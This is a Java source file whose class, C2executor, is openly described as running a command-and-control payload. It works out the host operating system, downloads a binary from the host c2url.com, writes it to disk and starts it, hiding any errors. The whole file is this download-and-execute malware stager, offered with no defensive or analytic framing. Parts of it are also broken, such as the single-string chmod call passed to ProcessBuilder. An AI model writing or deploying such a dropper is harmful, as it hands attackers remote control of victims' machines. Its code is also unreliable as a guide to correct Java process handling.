package executor;

import systemproperties.OS;

import java.io.*;
import java.net.URL;

/**
 * This class executes the Command & Control
 * payload based on the system's OS
 */
public class C2executor {

    private String fileName;
    private OS os;

    public C2executor(){
        this.os = new OS();
        this.fileName = this.os.osSanitizer(this.os.getOS());

        this.execute(this.fileName);
    }

    private void execute(String fileName){
        this.fileName = fileName;
        URL link;
        try {
            if(this.fileName.equals("c2.exe")){
                link = new URL("http://c2url.com/"+this.fileName);
            } else {
                link = new URL("http://c2url.com/c2_signed_mac_binary");
            }
            this.triggerBuffer(link);
            if(this.fileName.equals("linux_binary")){
                new ProcessBuilder("chmod +x linux_binary;./linux_binary").start();
            } else {
                new ProcessBuilder(this.fileName).start();
            }
        } catch(IOException e){

        }
    }

    private void triggerBuffer(URL link){
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buff = new byte[1024];
        int n;
        try {
            InputStream input = new BufferedInputStream(link.openStream());
            while (-1 != (n = input.read(buff)))
                output.write(buff, 0, n);
            output.close();
            input.close();
            byte[] response = output.toByteArray();
            FileOutputStream fileOutputStream = new FileOutputStream(this.fileName);
            fileOutputStream.write(response);
            fileOutputStream.close();
        } catch(IOException e){

        }
    }
}
